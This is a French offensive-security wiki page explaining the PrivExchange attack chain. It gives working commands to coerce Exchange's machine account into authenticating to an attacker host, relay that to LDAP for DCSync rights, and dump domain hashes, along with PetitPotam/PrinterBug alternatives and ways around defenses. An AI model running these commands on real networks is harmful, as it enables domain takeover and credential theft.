---
title: "PrivExchange : coercition d'Exchange et relais vers Active Directory"
order: 4
description: "Contraindre le compte machine d'Exchange à s'authentifier auprès d'un hôte attaquant via les notifications push EWS, puis relayer ce NTLM privilégié vers LDAP sur un contrôleur de domaine pour obtenir un DCSync, car Exchange détient historiquement WriteDacl sur l'objet du domaine. Inclut la primitive PushSubscription, les alternatives PetitPotam et PrinterBug, et la suite vers l'administrateur du domaine."
keywords:
  - PrivExchange
  - EWS push notification
  - NTLM relay
  - WriteDacl
  - DCSync
---

# PrivExchange

Exchange s'authentifie **avec son propre compte machine** lorsqu'il rappelle un client, et dans un déploiement non durci les serveurs Exchange (par le biais du groupe `Exchange Windows Permissions`) détiennent **`WriteDacl` sur l'objet du domaine**. PrivExchange soude ces deux faits ensemble : faire en sorte qu'Exchange s'authentifie auprès de vous, [relayer](../../directory/active-directory/authentication/ntlm/relay.md) cette authentification vers le **LDAP** d'un contrôleur de domaine, et dépenser l'accès en écriture d'Exchange pour ajouter une ACE **DCSync** à un principal que vous contrôlez. Un seul identifiant de boîte aux lettres peu privilégié devient administrateur du domaine.

## La primitive de coercition

L'opération EWS **`SubscribeToPushNotification`** demande à Exchange d'envoyer des notifications d'événements à une URL de rappel que vous choisissez. Exchange se connecte consciencieusement à cette URL et, lorsqu'il est mis au défi, s'authentifie via NTLM avec le **compte machine du serveur Exchange** (`EXCH$`), qui est membre d'`Exchange Windows Permissions`. La requête d'abonnement n'a besoin que d'un identifiant de boîte aux lettres valide pour être acceptée. L'hôte attaquant collecte cette authentification de compte machine et la relaie plus loin avant que le handshake ne se termine.

## La chaîne de relais

Montez d'abord le relais pour que l'authentification contrainte ait un endroit où atterrir, puis déclenchez la coercition :

```bash
# 1. Relay listener: forward incoming NTLM to the DC's LDAP and escalate the named user to DCSync
ntlmrelayx.py -t ldap://dc01.example.local --escalate-user attacker

# 2. Coerce Exchange: push-subscribe it to authenticate back to the attacker host
privexchange.py -ah 10.10.14.7 mail.example.com -u john.doe -p 'Password1' -d example.local
```

Ce que vous devriez observer : `privexchange.py` signale que l'abonnement a été accepté, puis en quelques secondes `ntlmrelayx` enregistre une connexion entrante provenant de `EXAMPLE\EXCH$`, l'authentifie auprès de LDAP, et affiche qu'il a ajouté les droits DCSync (ACE de réplication) à `attacker` sur l'objet du domaine. Si au lieu de cela vous voyez le relais s'authentifier mais échouer à modifier la DACL, le compte relayé ne détient pas réellement `WriteDacl` sur cette version, lisez la suite ci-dessous.

Collectez ensuite les empreintes que les nouveaux droits vous permettent d'extraire :

```bash
# Use the granted DCSync rights to replicate the krbtgt and admin hashes
secretsdump.py -just-dc 'example.local/attacker:Password1@dc01.example.local'
```

L'empreinte `krbtgt` dans cette sortie est une clé de golden ticket ; l'empreinte Administrator est un contrôle immédiat du domaine. C'est la suite : du DCSync à l'administrateur du domaine.

## Variantes et coercition alternative

- **Direction du relais.** Le PrivExchange classique relaie **depuis** Exchange vers LDAP. Des problèmes de relais NTLM ultérieurs relaient également **vers** un front end Exchange (par exemple pour écrire des permissions de boîte aux lettres ou atteindre le back end PowerShell), donc traitez le compte machine d'Exchange à la fois comme une source et comme une cible de relais.
- **`PetitPotam`** contraint l'authentification du compte machine d'un hôte cible via l'interface EFSRPC (`lsarpc`/`efsrpc`), et le **PrinterBug** (`MS-RPRN` `RpcRemoteFindFirstPrinterChangeNotification`) la contraint via le spouleur d'impression. Pointé vers le serveur Exchange, l'un ou l'autre produit la même authentification `EXCH$` que PrivExchange obtient via EWS, sans avoir besoin d'un identifiant de boîte aux lettres. Voir [coercition](../../directory/active-directory/authentication/ntlm/coercion.md).
- **Choix de la cible de relais.** Lors du relais vers LDAP, les exigences de signature décident de la faisabilité : si la signature LDAP est imposée, relayez vers **LDAPS** ou pivotez la cible vers un point de terminaison d'inscription web [ADCS](../../directory/active-directory/authentication/credentials/ntds-and-dcsync.md) ou vers une écriture RBCD/shadow-credential à la place.

## Lorsque l'octroi direct de DCSync est bloqué

Le modèle de permissions fractionnées de Microsoft et l'Extended Protection for Authentication (EPA) coupent les deux jambes de la chaîne, donc l'escalade est conditionnée par la configuration :

- Confirmez qu'`Exchange Windows Permissions` (et le groupe des serveurs Exchange) détiennent toujours `WriteDacl`/`WriteOwner` sur l'objet du domaine pendant l'[énumération des ACL](../../directory/active-directory/dacl/acl-enumeration.md) avant de vous fier à l'octroi de DCSync.
- Là où l'écriture sur l'objet du domaine a disparu, relayez l'authentification contrainte d'Exchange vers une **autre écriture privilégiée** à la place : configurez une délégation contrainte basée sur les ressources sur un ordinateur que vous pouvez contrôler, ou ajoutez des [shadow credentials](../../directory/active-directory/authentication/kerberos/shadow-credentials.md) (`msDS-KeyCredentialLink`) à une cible, puis escaladez via [prise de propriété et réécriture d'ACL](../../directory/active-directory/dacl/ownership-and-acl-rewrite.md).

## Notes d'exploitation

- Elle n'a besoin que d'un **seul identifiant de boîte aux lettres** pour le chemin EWS, elle se marie donc directement avec un succès de [spraying](password-spraying.md) et atteint DA sans aucune exécution de code sur le serveur.
- L'EPA sur les points de terminaison Exchange et le channel binding LDAP sur le DC sont les bloqueurs habituels ; si le relais s'authentifie mais que le bind LDAP est rejeté, le channel binding est activé et vous avez besoin d'un contournement d'EPA ou d'une autre cible de relais.
- La coercition est un trafic EWS authentifié et laisse Exchange fonctionner normalement, elle est donc bien plus discrète que de déclencher une chaîne de RCE contre la même machine.

## Outils

- **PrivExchange** (dirkjanm) : la coercition par abonnement push EWS.
- **Impacket** (`ntlmrelayx.py --escalate-user`, `secretsdump.py`) : relais vers LDAP, octroi de DCSync, réplication des empreintes.
- **Coercer / PetitPotam / PrinterBug** : coercition sans identifiant du compte machine de l'hôte Exchange.

## Références

- [PrivExchange (dirkjanm)](https://github.com/dirkjanm/PrivExchange)
- [dirkjanm: Abusing Exchange, one API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [The Hacker Recipes: NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
